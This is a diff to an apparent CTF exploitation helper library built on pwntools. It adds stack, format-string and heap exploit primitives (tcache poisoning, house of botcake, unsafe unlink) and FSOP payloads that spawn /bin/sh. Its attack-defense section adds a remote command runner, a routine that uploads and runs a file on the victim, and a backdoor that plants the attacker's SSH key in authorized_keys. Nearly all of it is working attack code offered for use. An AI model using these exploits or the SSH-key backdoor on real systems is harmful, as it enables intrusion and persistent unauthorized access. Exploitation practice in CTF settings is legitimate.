@@ -37,15 +37,25 @@ def find_libc(offset={}):
     return libcdb.search_by_symbol_offsets(offset, select_index=idx)
 
 # Stack
+def getoffset(length=0x1000, bits=64):
+    pattern = cyclic(length, n=bits//8)
+    sl(pattern)
+    io.wait()
+    core = io.corefile
+    rsp = core.rsp
+    offset = cyclic_find(core.read(rsp, 4 if bits == 32 else 8), n=bits//8)
+    return offset
+
 def onegadget():
     output = process(["one_gadget", "-r", libc.path]).recvline().decode().strip().split(" ")
     return [int(addr) for addr in output]
 
-def ret2libc(got):
+def ret2libc(gots, return_to="_start"):
     rop = ROP(elf)
-    rop.printf(got) # rop.puts(got)
-    rop.raw(rop.ret.address)
-    rop.main()
+    for got in gots:
+        rop.raw(rop.ret.address)
+        rop.printf(got) # rop.puts(got)
+    rop.raw(elf.sym[return_to])
     return rop.chain()
 
 def ret2system():
@@ -168,7 +178,7 @@ def execve(addr, cmd=None):
     rop.call(syscall, [addr, 0, 0])
     return rop.chain()
 
-def srop(binsh, rip=None, rsp=None):
+def srop(binsh, rip=0, rsp=0):
     rop = ROP(elf)
     rip = rip if rip else rop.find_gadget(['syscall'])[0]
     frame = SigreturnFrame()
@@ -247,16 +257,14 @@ def write2byte(where, what, offset = 11):
     sl(payload.ljust(0x10, b"\x00") + p64(where))
     sleep(0.1)
 
-def write8byte(where, what):
-    n = max(1, (what.bit_length() + 15) // 16)
+def write8byte(where, what, byte8=False):
+    n = 4 if byte8 else max(1, (what.bit_length() + 15) // 16)
     for i in range(n):
         # point %<write_idx>$hn at where + 2*i
         set(where + 2*i)
         part = (what >> (16*i)) & 0xffff
         write2byte(where + 2*i, part)
         sleep(0.1)
-
-
 
 # Exit
 rol = lambda val, r_bits, max_bits: \
@@ -281,6 +289,58 @@ def demangle(val):
         val ^= (v >> 12)
         mask >>= 12
     return val
+
+
+# Heap Technique
+def tcache_poison(idx, size, where, what):
+    global heap
+    alloc(idx, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    alloc(idx+1, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    free(idx)
+    free(idx + 1)
+    edit(idx + 1, p64(mangle(heap, target)))  # overwrite fd pointer
+    alloc(idx+2, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    alloc(idx+3, size, what)
+
+def house_of_botcake(idx, size, where, what, cheap=False):
+    global heap
+    if not cheap:
+        for i in range(9):
+            alloc(idx + i, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+
+    for i in range(9):
+        free(idx + i)
+    free(idx + i - 1)
+    free(idx + i)
+    free(idx + i - 1)
+    for i in range(7):
+        alloc(idx + i + 9, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    alloc(idx + i + 9 + 1, size, p64(mangle(heap, target)))
+    alloc(idx + i + 9 + 2, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    alloc(idx + i + 9 + 3, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    alloc(idx + i + 9 + 3, size, what)
+
+def unsafe_unlink(idx, size, fake_fd, fake_bk, idx_victim, victim_chunk_addr):
+    global heap
+
+    # holder_addr = heap + 0x30d0
+    # victim_chunk_addr = heap + 0x31a0
+    # fake_fd = holder_addr - 0x18
+    # fake_bk = holder_addr - 0x10
+    # log.info("Holder addr: %#x", holder_addr)
+    # log.info("Victim chunk addr: %#x", victim_chunk_addr)
+    # log.info("Fake fd: %#x", fake_fd)
+    # log.info("Fake bk: %#x", fake_bk)
+    alloc(idx, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    alloc(idx+1, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    edit(idx, (p64(0) + p64(size - 8) + p64(fake_fd) + p64(fake_bk)).ljust(size - 8, b"\x00") + p64(size - 8)) #Fake chunk
+    edit(idx_victim, p64(victim_chunk_addr))
+    for i in range(7): # Prepare tcache
+        alloc(idx + 1 + i, size, (p64(heap >> 12)).rjust(size, b"\x00"))
+    for i in reversed(range(7)): # Fill tcache
+        free(idx + 1 + i)
+    free(idx + 1) # Free victim chunk to unsorted bins
+
 
 # FSOP
 # https://niftic.ca/posts/fsop/
@@ -341,6 +401,45 @@ def fsrop_context(fp=None, offset=0x48, rip=None, rsp=None, rbp=0, rdi=0, rsi=No
     fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x38 # _IO_wfile_seekoff -> _IO_switch_to_wget_mode+37
     return bytes(fs)
 
+def fsop_via__libio_codecvt_out(fp=None, offset=0x18):
+    fp = libc.sym["_IO_2_1_stdout_"] if fp is None else fp
+    gadget = libc.address + 0x001563c3 # add rdi, 0x10; jmp rcx;
+
+    fs = IO_FILE_plus_struct()
+    fs.flags = 1
+    fs._IO_read_ptr = libc.sym["system"] + 4
+    fs._IO_read_end = libc.sym["system"] + 3
+    fs._IO_write_base = 0
+    fs._IO_write_ptr  = fs._IO_write_base + 8
+    fs._IO_write_end = b"/bin/sh\x00"
+    fs._IO_save_base   = gadget
+    fs._IO_backup_base = 0
+    fs._IO_save_end    = fp + 0x20
+    fs._lock = fp + 0x100
+    fs._codecvt   = fp + 0x58 - 0x38
+    fs._wide_data = fp + 0x08 - 0x18
+    fs._mode = 1
+    fs.vtable = libc.sym["_IO_wfile_jumps"] + offset - 0x18
+    return bytes(fs)
+
+def fsop_misalign(fp=None, offset=0x18):
+    fp = libc.sym["_IO_2_1_stdout_"] if fp is None else fp
+    onegadget = libc.address + 0x52c92 # do_system + 2
+    fs = IO_FILE_plus_struct()
+    fs._IO_read_end  = fp + 0x18 - 0x68
+    fs._IO_read_base = libc.sym['setcontext'] # Call
+    fs._IO_write_base = b"A"*8
+    fs._IO_save_end  = b"/bin/sh\x00"
+    fs._old_offset = 0
+    fs.markers = fp + 0x58
+    fs.chain = fp - 8
+    fs._cur_column    = p64(fp) #Lock
+    fs._vtable_offset = p64(fp) #Lock
+    fs.unknown1      =  p32(0) + p16(0) + p8(0) + p64(fp - 0xd0) + p64(onegadget)
+    fs._offset = 0
+    fs.unknown2 = p64(0)*1 + p64(libc.sym["_IO_wfile_jumps"] + offset - 0x18) #vtable
+    return bytes(fs)[:0xd8]
+
 def stdout_leak(target=None, size=0x8):
     return p64(0xfbad1800) + p64(0)*3 + (p64(target) + p64(target + size) if target is not None else b'\x00')
 
@@ -359,14 +458,24 @@ def fsop_shell(fp=None, rip=None, exit=True):
     )
 
 # For AD
+def write_flag(flag):
+    with log.progress(f"Writing {flag} to flag.txt") as p:
+        with open("flag.txt", "ab") as f:
+            f.write(flag)
+        p.success(f"flag.txt -> {flag} written")
+
+def safe_send(cmd):
+    io.sendline(f"echo 'success\n';{cmd};echo 'success\n';")
+    io.recvuntil("success\n", timeout=1)
+    return io.recvuntil("success\n", timeout=1).strip().decode()
+
+
 def get_flag():
     with log.progress("Running cat f*") as p:
         try:
-            io.sendline(b"echo 'success';cat f*")
-            io.recvuntil("success\n", timeout=0.1)
-            flag = io.recvline(timeout=0.1).strip()
+            flag = safe_send("cat /f*")
             if flag:
-                p.success(f"Flag -> {flag.decode()}")
+                p.success(f"Flag -> {flag}")
                 return flag
             else:
                 p.failure("Failed to get flag")
@@ -374,8 +483,34 @@ def get_flag():
             p.failure("Connection closed")
     return None
 
-def write_flag(flag):
-    with log.progress(f"Writing {flag} to flag.txt") as p:
-        with open("flag.txt", "ab") as f:
-            f.write(flag)
-        p.success(f"flag.txt -> {flag} written")
+# File upload
+def upload_file(src, dst, after="$"):
+    # zaffir31's upload_file function https://gist.github.com/zafirr31/addc4ce75696cae473e74e40c6bca1e7
+    data = b64e(read(src))
+
+    io.recvuntil(after) if after else None
+    io.sendline("stty -echo")
+    io.recvuntil(after) if after else None
+    io.sendline(f"base64 -d <<EOF > {dst}")
+
+    size = 1200 # max should be around 1440 (default MTU is 1500)
+    nchunks = len(data) // size
+    for i in range(nchunks + 1):
+        log.info(f"Sending chunk {i}/{nchunks}")
+        io.sendline(data[i*size:(i+1)*size]) # TCP will handle any out-of-order possibilities on server side
+        sleep(0.01) # probably dont need this, but to prevent the possible random case of out-of-order from client side
+    io.sendline("EOF")
+    io.recvuntil(after) if after else None
+
+    io.sendline(f"chmod +x {dst}")
+    io.recvuntil(after) if after else None
+    io.sendline(f"{dst}")
+
+def backdoor(myip, ip, port):
+    with log.progress("Installing backdoor via ssh") as p, context.local(log_level='debug'):
+        user = safe_send("whoami").strip()
+        safe_send(f"/bin/mkdir /home/{user}/.ssh/")
+        safe_send(f"/bin/chmod 700 /home/{user}/.ssh/")
+        upload_file("../../hazy.pub", f"/home/{user}/.ssh/authorized_keys", None)
+        safe_send(f"/bin/chmod 600 /home/{user}/.ssh/authorized_keys")
+        p.status(f"Try now -> ssh -i ~/hazy {user}@{ip} -p {port}")
